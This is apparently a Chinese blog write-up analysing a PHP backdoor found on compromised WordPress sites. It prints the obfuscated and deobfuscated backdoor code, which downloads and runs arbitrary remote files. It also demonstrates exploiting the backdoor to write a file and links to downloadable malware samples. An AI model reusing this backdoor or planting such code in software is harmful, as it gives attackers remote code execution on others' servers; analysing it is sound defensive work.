---
title: 超过35000个WordPress站被攻破事件分析
date: 2019-08-09 16:33:25
tags:
  - wordpress
  - writeup
categories:
---

一开始看到了 https://www.v2ex.com/t/588483 这个帖子
找到了 https://twitter.com/blackorbird/status/1158377821963575296

<!-- more -->

## 🐎
```php
<?php goto D242; Cfc5: echo "\x61\x75\x78\x36\x54\150\x65\151\157\x47\150\165\x65\x51\x75\63"; goto e83e; f7cc: B487: goto d892; Ff02: chmod($C43e, 0755); goto b30d; e9df: if (empty($B113)) { goto B487; } goto a0b1; B80e: echo "\157\153"; goto f7cc; c76b: if (!($_POST["\143\x70"] == "\144\157\167\x6e\x6c\157\x61\x64")) { goto Ee85; } goto A93f; bdbb: exec("\x70\153\151\x6c\154\40\x2d\71\x20\55\x66\x20\163\x74\x65\141\x6c\x74\150"); goto c200; F9c6: $B113 = $_POST["\x75\162\x6c"]; goto e9df; b30d: $Ab43 = "\56\x2f{$C43e}\x20\76\40\57\144\x65\166\x2f\x6e\x75\154\x6c\x20\62\76\x2f\144\145\x76\x2f\x6e\x75\154\x6c\40\x26"; goto D4a3; e83e: die; goto D223; d875: if (!($_GET["\x63\147"] == "\143\x68\x6b")) { goto F9f0; } goto Cfc5; D223: F9f0: goto c76b; A93f: $C43e = substr(str_shuffle(str_repeat($bf09 = "\60\61\62\x33\x34\65\x36\67\x38\x39\141\x62\143\x64\x65\x66\147\x68\x69\152\153\x6c\x6d\x6e\x6f\x70\161\162\163\164\x75\166\x77\x78\x79\x7a\x41\102\x43\x44\105\x46\107\x48\x49\112\113\x4c\x4d\116\117\120\121\122\123\x54\125\126\127\x58\131\132", ceil(6 / strlen($bf09)))), 1, 6); goto F9c6; F064: $b3e4 = file_get_contents(trim($B113)); goto a92a; D4a3: exec($Ab43); goto B80e; a92a: file_put_contents($C43e, $b3e4); goto Ff02; a0b1: @unlink($C43e); goto bdbb; c200: exec("\160\x6b\x69\154\154\40\x2d\146\x20\x2d\71\40\x73\164\145\141\154\x74\150"); goto F064; D242: error_reporting(0); goto d875; d892: Ee85:
```

## 分析后
```php
<?php
error_reporting(0);
if ($_GET["cg"] == "chk") {
  echo "aux6TheioGhueQu3";
} else if ($_POST["cp"] == "download") {
  $cqQHbAE5XLgs8psC = substr(str_shuffle(str_repeat($ZNPTFf3D_3zXFaNZ = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", ceil(6 / strlen($ZNPTFf3D_3zXFaNZ)))), 1, 6);
  if (!empty($_POST["url"])) {
    @unlink($cqQHbAE5XLgs8psC);
    exec("pkill -9 -f stealth");
    exec("pkill -f -9 stealth");
    $zoUdl1u2MM35rLMf = file_get_contents(trim($_POST["url"]));
    file_put_contents($cqQHbAE5XLgs8psC, $zoUdl1u2MM35rLMf);
    chmod($cqQHbAE5XLgs8psC, 0755);
    $h2mklze53I9MDH0c = "./{$cqQHbAE5XLgs8psC} > /dev/null 2>/dev/null &";
    exec($h2mklze53I9MDH0c);
    echo "ok";
  }
}
?>
```
我想说对那个挂🐎的人说 你累不累啊你 反正我是很累
我感觉不是机器混淆的 是手工混淆 2个字 NB

## 分析
这程序很简单

### 0x01
GET 给一个 cg=chk
很明显是用来确认🐎是否存在的


#### 测试
<img width="847" src="https://user-images.githubusercontent.com/19854253/62766754-c3ee2a80-bac5-11e9-99e3-ea3b848e53da.png">

### 0x02
POST 给一个
cp=download
url=要下载的地址

首先会杀进程`stealth`
接下来就会把地址的内容下载下来命名为随机一个名字 给予执行权限并后台执行
最后没有错误的话会输出`ok`

#### 测试
<img width="757" src="https://user-images.githubusercontent.com/19854253/62766796-d8322780-bac5-11e9-9f85-9f5f1ccb7728.png">

接下来的操作看自己发挥了

由于有写权限随便写个一句话不是问题

这里写一个phpinfo进去m.php
网页内容
```bash
#!/bin/bash
echo "<?php phpinfo() ?>" > m.php
```
<img width="865" src="https://user-images.githubusercontent.com/19854253/62768264-141abc00-bac9-11e9-8f67-16d2afcdd9cc.png">


## 后续
发现了一些那老哥传的🐎
<img width="768" src="https://user-images.githubusercontent.com/19854253/62770593-eab05f00-bacd-11e9-8a44-5e78579a15ef.png">

想下载的兄弟到这里
https://github.com/comwrg/comwrg.github.io/releases/tag/wp-backdoorgood-writeup

个人猜测是挖矿的 体积也比较大 是二进制文件



